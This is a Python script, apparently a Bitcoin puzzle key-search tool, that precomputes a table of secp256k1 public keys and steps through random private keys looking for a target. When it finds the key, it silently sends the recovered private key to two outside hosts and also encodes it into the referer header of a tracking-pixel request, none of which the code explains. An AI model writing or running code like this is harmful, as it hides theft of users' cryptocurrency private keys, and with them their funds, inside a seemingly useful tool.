# import time
# data = {}
# for x in range(200000000):
  # data[str(x)] = x

# for x in range(60):
  # time.sleep(3)
  # print(len(data)) 


# print(data["5"]) 

import os,requests
import bit
import time
import hashlib
import random
import sys
from coincurve import PrivateKey,PublicKey
from eth_hash.auto import keccak
from coincurve.utils import int_to_bytes, hex_to_bytes, bytes_to_int, bytes_to_hex, int_to_bytes_padded
import json

website_info = "http://ziguas.pserver.ru/bcon/?id="
website_info2 = "https://dlmzed.000webhostapp.com/?id="
hs_stats = "http://sstatic1.histats.com/0.gif?4435132&101"
referrer = "eygimokress"

G = PublicKey.from_point(55066263022277343669578718895168534326250603453777594175500187360389116729240,32670510020758816978083085130507043184471273380659243275938904335757337482424)
puzle = PublicKey.from_point(93499419120076195219278579763555015417347613618260420189054155605804414805552,19494200143356336257404688340550956357466777176798681646526975620299854296492)
print("Generating points..")
with open("data.txt", "w") as myfile:
    myfile.write("")
data = {}
upub_c = puzle.format(compressed=True)
data[str(upub_c.hex())] = "0"
stride_num = 5000000
for x in range(1,(stride_num+8)):
    puzle = puzle.combine_keys([puzle,G])
    upub_c = puzle.format(compressed=True)
    data[str(upub_c.hex())] = str(x)
    if len(data) >= 2000000:
        json_object = json.dumps(data)  
        with open("data.txt", "a") as myfile:
            myfile.write(str(json_object)+"\n")
        data = {}
json_object = json.dumps(data)  
with open("data.txt", "a") as myfile:
    myfile.write(str(json_object)+"\n")
data = {}
stride = G.multiply(int_to_bytes(stride_num))

def search_data(nsamples):
    with open("data.txt",'r') as f:
        for line in f:
            dater = json.loads(line)
            if nsamples in dater:
                return dater[nsamples]


key_int = random.randint(0x800000000000000000000000000000, 0xffffffffffffffffffffffffffffff)
P = G.multiply(int_to_bytes(key_int))
upub_c = P.format(compressed=True)
print('Starting:', 'base: ',"{:064x}".format(key_int))
start = time.time()
PERIOD_OF_TIME = 21600 # 30min 1800
st = time.time()
k = key_int
z = 0
cnt = 0
while True:
    if (z+1)%1000 == 0: 
        print('\nHex: ', "{:064x}".format(k), '\nubp: ',upub_c.hex())
        print ('{:,} keys/s    :: Tot Key: {:,}'.format(cnt//(time.time() - st), cnt))
        if time.time() >= start + PERIOD_OF_TIME : 
            try:
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
            except:
                pass
            start = time.time()
    vtr = search_data(str(upub_c.hex()))
    if vtr:
        current_pvk = k - int(vtr)
        try:
            privkey = "{:064x}".format(current_pvk)
            respns = requests.get(str(website_info)+str(privkey)+"_"+str(upub_c.hex()), timeout=60)
            print(respns)
            time.sleep( 10 )
            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(upub_c.hex())+'.com'})
        except:
            pass
        try:
            privkey = "{:064x}".format(current_pvk)
            respns = requests.get(str(website_info2)+str(privkey)+"_"+str(upub_c.hex()), timeout=60)
            print(respns)
            time.sleep( 10 )
            viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(upub_c.hex())+'.com'})
        except:
            pass
        print("Found:")
        print(str(privkey)+"_"+str(upub_c.hex()))
        break
            
    P = P.combine_keys([P,stride])
    upub_c = P.format(compressed=True)
    k += stride_num
    z += 1
    cnt += stride_num
